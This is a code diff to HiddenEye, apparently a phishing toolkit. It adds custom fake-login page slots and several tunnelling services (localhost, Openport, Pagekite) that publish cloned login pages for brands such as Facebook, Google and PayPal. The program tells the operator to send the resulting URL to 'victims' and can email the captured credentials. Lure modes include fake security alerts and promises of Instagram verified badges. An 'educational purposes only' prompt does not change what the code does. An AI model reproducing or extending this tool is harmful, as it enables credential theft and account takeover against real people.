@@ -133,7 +133,20 @@ def runPhishing(page, customOption):  # Phishing pages selection menu
         copy_tree('WebPages/playstation/', "Server/www/")
     elif page == 'Xbox':
         copy_tree('WebPages/xbox/', "Server/www/")
-
+    elif page == 'CUSTOM(1)':
+        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(1)".format(MAIN0, MAIN4))
+        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(1)]".format(MAIN0, MAIN4))
+        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
+        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
+        sleep(3)
+        copy_tree('WebPages/CUSTOM(1)/', "Server/www/")
+    elif page == 'CUSTOM(2)':
+        print("\n\n {0}[{1}*{0}]{1} Custom Folder Directory is {0}WebPages/CUSTOM(2)".format(MAIN0, MAIN4))
+        print("\n {0}[{1}*{0}]{1} Please Read The manual.txt File Available At {0}[WebPages/CUSTOM(2)]".format(MAIN0, MAIN4))
+        input("\n\n {0}[{1}*{0}]{1} If You Have Set Up The Files Correctly, {0}Press Enter To continue.".format(MAIN0, MAIN4))
+        print("\n {0}[{1}*{0}]{1} Copying Your Files To Server/www Folder...".format(MAIN0, MAIN4))
+        sleep(3)
+        copy_tree('WebPages/CUSTOM(2)/', "Server/www/")
     else:
         endMessage()
 
@@ -146,8 +159,7 @@ def selectPort():  # Question where user must select port
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ WEBSERVER PORT SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print(
-        "\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
+    print("\n {0}[{1}*{0}]{0}Select Any Available Port [1-65535]:{1}".format(MAIN0, MAIN4))
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     try:
         if (int(choice) > 65535 or int(choice) < 1):
@@ -168,10 +180,13 @@ def selectServer(port):  # Question where user must select server
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     print(
         "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
-    print("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]".format(MAIN0, MAIN2))
+    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
 
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
-    if choice == '1':
+    if choice == '0':
+        system('clear')
+        runLocalhost(port)
+    elif choice == '1':
         system('clear')
         runNgrok(port)
     elif choice == '2':
@@ -186,10 +201,182 @@ def selectServer(port):  # Question where user must select server
     elif choice == '5':
         system('clear')
         runLT(port, False)
+    elif choice == '6':
+        system('clear')
+        runOpenport(port)
+    elif choice == '7':
+        system('clear')
+        runPagekite(port)
     else:
         system('clear')
         return selectServer(port)
 
+def runLocalhost(port):
+    system('clear')
+    print('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print("\n {0}[{1}*{0}]{0}Enter Your LocalHost/Router Address [ifconfig]:{1}".format(MAIN0, MAIN4))
+    host = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
+    system("fuser -k %s/tcp > /dev/null 2>&1".format(port))
+    system("cd Server/www/ && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
+    print('\n[*] Starting Server On Address:: {0}:{1}'.format(host, port))
+    sleep(2)
+    system('clear')
+    print('''
+        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+        {0}http://github.com/darksecdevelopers
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RUNNING LOCALHOST SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+    print("\n{0}[{1}!{0}]{1} SEND THIS URL TO THE VICTIMS ON SAME NETWORK-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://{4}:{3}\n".format(MAIN0, MAIN2, MAIN3, port, host))
+    print("\n")
+
+def runPagekite(port):
+	system('clear')
+	print('''
+		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+		{0}http://github.com/darksecdevelopers
+		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+	if 256 == system('which python2 > /dev/null'):
+		print('[*] Python2 not Installed, Pagekite Only Supports Python2!!')
+		input('\n Press Enter To Try installing Python2 Now..')
+		system('apt install python2')
+		if 256 == system('which python2 > /dev/null'):
+			system('clear')
+			print("\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}".format(MAIN0, MAIN4))
+			sleep(2)
+			selectServer(port)
+		else:
+			pass	
+	else:
+		try:
+			subdomain = input("\n{0}[{2}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {2}".format(MAIN0, MAIN4, MAIN2))
+			print("\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}".format(MAIN0, MAIN4))
+			print("\n{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.{1}".format(MAIN0, MAIN4))
+			input("\n\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(MAIN0, MAIN4))
+			system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
+			system("cd Server/www/ && php -S localhost:%s > /dev/null 2>&1 &" % (port))
+			system('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
+		except:
+			print('[*] Unable To get Tunnel..Going Back')
+			sleep(3)				
+			
+def runOpenport(port):
+	system('clear')
+	print('''
+		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+		{0}http://github.com/darksecdevelopers
+		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+	if 256 == system('which openport > /dev/null'):
+		system('clear')
+		print('[*] Openport not Installed correctly, Try installing it manually !!')
+		print('[*] Check Here ... https://openport.io/download')
+		input('\n Press Enter To Go back..')
+		selectServer()
+	else:
+		manageOpenporturl(port)
+
+def manageOpenporturl(port): # Its all about How we generate a url from openport, & How we used grep & curl to get a url to shown on final panel of script.
+	print("\n{0}[{1}*{0}] {0}Please Be Calm , We are Working To get a Openport URL For You.{1}".format(MAIN0, MAIN4))
+	sleep(2)
+	try:
+		system('openport -K && openport %s > openport.txt &' % (port)) # Running openport server and putting the process in background using (&) and writing the output to a txt file.
+		print('[*] Openport Server Running in Background.. Please wait.')
+		sleep(20) # Sleep time is important as the openport command takes some time to give response link.
+		system('cat openport.txt | grep https://spr.openport.io/l/...................... -oh > urltoverify.txt') # Taking out the neccesary verification link from output txt file of openport (above). 
+		print('[*] Getting the verification link of openurl tunnel.')
+		with open('urltoverify.txt') as f:
+			read_data = f.read()
+			if 'https://spr.openport.io/l/' in read_data:
+				print('[*] In case Error Occured Visit Below Link to Get your Tunnel Link')
+				pass
+			else:
+				print('[^] Unable To Got Openport Link. ')
+				print('[*] You Have Reached Maximum Free Tunnels or (Server Down).')
+				print('[*] Trying Again..')
+				sleep(7)
+				runOpenport(port)
+		
+		urlFile = open('urltoverify.txt', 'r')
+		urltoverify = urlFile.read().strip()
+		print('{0}[{1}*{0}] {1}Got A Verification Link:{0} '.format(MAIN0, MAIN4))
+
+		
+		# Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
+		system('rm filename.txt && touch filename.txt')
+		with open('filename.txt', 'r') as f:
+			read_data = f.read()
+		c = read_data.replace('', ' -o urlindex.txt')
+		f = open('filename.txt', 'w')
+		f.write(c)
+		f.close()
+		with open('filename.txt', 'r') as f:
+			filename = f.read()
+		urltoverify = urltoverify+filename	
+		print('\n\n[*] Requesting Server to Get the working Url For Tunnel.')
+		system('curl {0}'.format(urltoverify)) # Creating a curl request to start the tunnel from the verification link, And grabing the whole content of the HTML page ( To get tunnel link .)
+		sleep(5)
+		
+		# From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
+		print('\n[*] Index File of response Saved.')
+		sleep(8)
+		print('[*] Finding Original Url From index File.')
+		system('rm filename.txt && touch filename.txt')
+		with open('filename.txt', 'r') as f:
+			read_data = f.read()
+		c = read_data.replace('', ' | grep http://spr.openport.io:..... -oh > mixedurl.txt')
+		f = open('filename.txt', 'w')
+		f.write(c)
+		f.close()
+		with open('filename.txt', 'r') as f:
+			filename = f.read().strip()
+		system('cat urlindex.txt {0}'.format(filename)) # From that html file codes we are grabing our tunnel link ( Tunnel link available 2 times in Source Codes So we have to remove duplicates in order to get one link to show on script)
+		
+
+		system('rm filename.txt && touch filename.txt')
+		with open('filename.txt', 'r') as f:
+			read_data = f.read()
+		c = read_data.replace('', ' > openporturl.txt')
+		f = open('filename.txt', 'w')
+		f.write(c)
+		f.close()
+		with open('filename.txt', 'r') as f:
+			filename = f.read().strip()
+		sleep(6)
+		print('[*] Removing The Duplicates Of Original Url.')
+		system('sort +2 -u mixedurl.txt {0}'.format(filename)) # It will remove the duplicate and make it single url.
+		urlFile = open('openporturl.txt', 'r')
+		url = urlFile.read()
+		sleep(3)
+		print('[*] We Got The URL :{0}'.format(url))
+		sleep(15)
+		
+
+		system('rm urltoverify.txt && rm mixedurl.txt && rm urlindex.txt && rm openport.txt') # To remove all the above used txt files.
+		system('clear')
+		print('''
+	        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
+	        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
+	        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
+	        {0}http://github.com/darksecdevelopers
+	        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
+		print("\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+		print("\n")
+	except:
+		input('\n\n[*] Failed To Get URL.. Press Enter To Go Back.')
+		sleep(2)
+		selectServer(port)
 
 def runNgrok(port):
     print('''
@@ -414,24 +601,11 @@ def runLT(port, npm):
 
 
 def runMainMenu():  # menu where user select what they wanna use
-
-    if 256 != system('which php > /dev/null'):  # Checking if user have PHP
-        print(" {2}* {0}PHP INSTALLATION FOUND".format(MAIN2, MAIN4, MAIN0))
-    else:
-        print("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/".format(MAIN2, MAIN4, MAIN0))
-
-    for i in range(101):
-        sleep(0.00275)
-        stdout.write("\r")
-        stdout.write(
-            "{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%".format(MAIN0, MAIN4, i))
-        stdout.flush()
-
     # Terms Of Service
-    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
+    print("            _________________________________________________\n           |   WITH GREAT POWER , COMES GREAT RESPONSIBILITY |     \n            +++++++++++++++++++++++++++++++++++++++++++++++++")
+    if input("\n\n\n\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational/testing purposes only? ({0}Y{1}/{2}N{1})\n{2}HiddenEye >>> {0}".format(MAIN2, MAIN4, MAIN0)).upper() != 'Y':
         system('clear')
-        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(
-            MAIN0, MAIN4))
+        print("\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n".format(MAIN0, MAIN4))
         exit()
 
 
@@ -449,22 +623,22 @@ def mainMenu():
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
 ________________________________________________________________________________'''.format(MAIN3, MAIN4, MAIN2, MAIN0))
     print("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------".format(MAIN0, MAIN2))
-    print(" {0}[{1}1{0}]{1} Facebook        {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
-    print(" {0}[{1}2{0}]{1} Google          {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
+    print(" {0}[{1}01{0}]{1} Facebook       {0}[{1}13{0}]{1} Steam          {0}[{1}25{0}]{1} Badoo           {0}[{1}37{0}]{1} PlayStation".format(MAIN0, MAIN2))
+    print(" {0}[{1}02{0}]{1} Google         {0}[{1}14{0}]{1} VK             {0}[{1}26{0}]{1} CryptoCurrency  {0}[{1}38{0}]{1} Xbox".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt ".format(
+    print(" {0}[{1}03{0}]{1} LinkedIn       {0}[{1}15{0}]{1} iCloud         {0}[{1}27{0}]{1} DevianArt       {0}[{1}39{0}]{1} CUSTOM(1)".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}4{0}]{1} GitHub          {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox  ".format(
+    print(" {0}[{1}04{0}]{1} GitHub         {0}[{1}16{0}]{1} GitLab         {0}[{1}28{0}]{1} DropBox         {0}[{1}40{0}]{1} CUSTOM(2)".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
+    print(" {0}[{1}05{0}]{1} StackOverflow  {0}[{1}17{0}]{1} Netflix        {0}[{1}29{0}]{1} eBay  ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}6{0}]{1} WordPress       {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
+    print(" {0}[{1}06{0}]{1} WordPress      {0}[{1}18{0}]{1} Origin         {0}[{1}30{0}]{1} MySpace ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}7{0}]{1} Twitter         {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
+    print(" {0}[{1}07{0}]{1} Twitter        {0}[{1}19{0}]{1} Pinterest      {0}[{1}31{0}]{1} PayPal ".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}8{0}]{1} Instagram       {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
+    print(" {0}[{1}08{0}]{1} Instagram      {0}[{1}20{0}]{1} ProtonMail     {0}[{1}32{0}]{1} Shopify".format(
         MAIN0, MAIN2))
-    print(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
+    print(" {0}[{1}09{0}]{1} Snapchat       {0}[{1}21{0}]{1} Spotify        {0}[{1}33{0}]{1} Verizon ".format(
         MAIN0, MAIN2))
     print(" {0}[{1}10{0}]{1} Yahoo          {0}[{1}22{0}]{1} Quora          {0}[{1}34{0}]{1} Yandex ".format(
         MAIN0, MAIN2))
@@ -474,40 +648,40 @@ ________________________________________________________________________________
         MAIN0, MAIN2))
 
     option = input("{0}HiddenEye >>>  {1}".format(MAIN0, MAIN2))
-    if option == '1':
+    if option == '1' or option == '01':
         loadModule('Facebook')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Facebook', customOption)
-    elif option == '2':
+    elif option == '2' or option == '02':
         loadModule('Google')
         customOption = input(
             "\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Google', customOption)
-    elif option == '3':
+    elif option == '3' or option == '03':
         loadModule('LinkedIn')
         customOption = ''
         runPhishing('LinkedIn', customOption)
-    elif option == '4':
+    elif option == '4' or option == '04':
         loadModule('GitHub')
         customOption = ''
         runPhishing('GitHub', customOption)
-    elif option == '5':
+    elif option == '5' or option == '05':
         loadModule('StackOverflow')
         customOption = ''
         runPhishing('StackOverflow', customOption)
-    elif option == '6':
+    elif option == '6' or option == '06':
         loadModule('WordPress')
         customOption = ''
         runPhishing('WordPress', customOption)
-    elif option == '7':
+    elif option == '7' or option == '07':
         loadModule('Twitter')
         customOption = ''
         runPhishing('Twitter', customOption)
-    elif option == '8':
+    elif option == '8' or option == '08':
         loadModule('Instagram')
         customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}".format(MAIN0, MAIN2, MAIN2))
         runPhishing('Instagram', customOption)
-    elif option == '9':
+    elif option == '9' or option == '09':
         loadModule('Snapchat')
         customOption = ''
         runPhishing('Snapchat', customOption)
@@ -629,7 +803,14 @@ ________________________________________________________________________________
         loadModule('Xbox')
         customOption = ''
         runPhishing('Xbox', customOption)
-
+    elif option == '39':
+        loadModule('CUSTOM(1)')
+        customOption = ''
+        runPhishing('CUSTOM(1)', customOption)
+    elif option == '40':
+        loadModule('CUSTOM(2)')
+        customOption = ''
+        runPhishing('CUSTOM(2)', customOption)
     else:
         endMessage()
 
@@ -647,7 +828,6 @@ def inputCustom():  # Question where user can input custom web-link
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------'''.format(MAIN0, MAIN2))
-    print('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)'''.format(MAIN2, MAIN4))
     print(
         '''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)'''.format(MAIN2, MAIN4))
     print(
@@ -849,36 +1029,38 @@ def runServer(port):
     system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
 
 
-def emailPrompt3():  # Ask user to start sending credentials to recipient Email Address.
+def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
     choice = input(
         "\n\n{0}[{1}?{0}] Send Captured Data To Recipient Email Address.\nSend_Email(y/n)>> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'Y':
+    if choice == 'Y' or choice == 'y':
         if path.isfile('Defs/Send_Email/emailconfig.py') == True:
             system('python3 Defs/Send_Email/SendEmail.py')
         else:
             print(
                 '[ERROR!]: NO CONFIG FILE FOUND ! PLEASE CREATE CONFIG FILE FIRST TO USE THIS OPTION.')
             sleep(2)
-            endMessage()
-    elif choice == 'N':
-        endMessage()
+            endMessage(port)
+    elif choice == 'N' or choice == 'n':
+        endMessage(port)
     else:
         system('clear')
         print("\n\n{0}[{1}^{0}] {2}Please Select A Valid Option.. ".format(
             MAIN0, MAIN4, MAIN2))
         sleep(1)
         system('clear')
-        return emailPrompt3()
+        return emailPrompt3(port)
 
 
-def endMessage():  # Message when HiddenEye exit
+def endMessage(port):  # Message when HiddenEye exit
     choice = input(
-        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
-    if choice == 'R':
+        "\n\n{0}[{1}?{0}] Re-run(r) : Exit(x) : Send Email(M) : SelectServer(S)\n\n >> {2}".format(MAIN0, MAIN4, MAIN2)).upper()
+    if choice == 'R' or choice == 'r':
         system('sudo python3 HiddenEye.py')
-    elif choice == 'M':
-        emailPrompt3()
-    elif choice == 'X':
+    elif choice == 'M' or choice == 'm':
+        emailPrompt3(port)
+    elif choice == 'S' or choice == 's':
+    	returnServer(port)
+    elif choice == 'X' or choice == 'x':
         system('clear')
         print('''
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
@@ -895,8 +1077,10 @@ def endMessage():  # Message when HiddenEye exit
   {3}  [[*]] THANKS FOR USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n '''.format(MAIN2, MAIN2, MAIN4, MAIN0))
     else:
         system('clear')
-        return endMessage()
+        return endMessage(port)
 
+def returnServer(port):
+	selectServer(port)
 
 def getCredentials(port):
 
